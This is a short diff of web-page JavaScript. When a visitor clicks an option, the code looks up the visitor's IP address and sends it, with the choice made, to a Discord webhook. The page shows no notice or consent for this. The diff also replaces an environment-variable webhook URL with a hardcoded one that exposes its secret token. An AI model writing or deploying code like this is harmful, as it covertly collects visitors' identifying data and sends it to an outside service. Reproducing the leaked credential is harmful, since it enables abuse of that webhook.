@@ -1,4 +1,4 @@
-const webhookURL = process.env.DISCORD_WEBHOOK_URL;
+
 
 document.addEventListener('DOMContentLoaded', function() {
     document.querySelectorAll('.option').forEach(function(option) {
@@ -11,7 +11,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     var ipAddress = data.ip;
                     console.log('IP adress is clear:', ipAddress);
 
-                    
+                    const webhookURL = 'https://discord.com/api/webhooks/1203757819946340393/OrKoNgdxXhdi9YCuVjCCeeOO5f2h9HhLZy5XbiBZBciUjbzi2RYK9ivrxcUAwR8UeQh8';
                     const payload = {
                         content: `IP address: ${ipAddress}\nChoice: ${choice}`
                     };
